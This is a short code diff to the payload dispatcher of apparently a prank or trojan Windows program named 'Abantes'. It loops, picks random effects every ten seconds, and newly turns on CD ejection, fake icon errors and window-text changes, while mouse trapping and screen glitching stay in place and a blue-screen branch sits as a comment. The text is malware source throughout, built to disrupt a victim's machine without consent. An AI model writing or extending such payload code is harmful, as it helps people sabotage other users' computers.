@@ -38,10 +38,13 @@ namespace Abantes.Payloads
                         {
                             //BSOD
                         }
+                        else
+                        {
+                            Anoying.ChangeWindowText();
+                        }
                         break;
                     case 3:
-                        string extractPath = @"C:\Windows\Defender";
-                        Wallpaper.Set(new Uri(extractPath + @"\wallpaper.jpg"), Wallpaper.Style.Stretched);
+                        //Cursor follow
                         break;
                     case 4:
                         if (_random.Next(100) > 50)
@@ -49,12 +52,16 @@ namespace Abantes.Payloads
                             Thread mouseTrap = new Thread(new ThreadStart(Anoying.MouseTrap));
                             mouseTrap.Start();
                         }
+                        else
+                        {
+                            Anoying.ChangeWindowText();
+                        }
                         break;
                     case 5:
                         Anoying.ChangeWindowText();
                         break;
                     case 6:
-                        //Anoying.EjectCd();
+                        Anoying.EjectCd();
                         break;
                     case 7:
                         Anoying.Screen_Screw();
@@ -63,7 +70,7 @@ namespace Abantes.Payloads
                         Anoying.Screen_Glitching();
                         break;
                     case 9:
-                        //Anoying.Display_Icons_Error();
+                        Anoying.Display_Icons_Error();
                         break;
                 }
                 Thread.Sleep(10000);
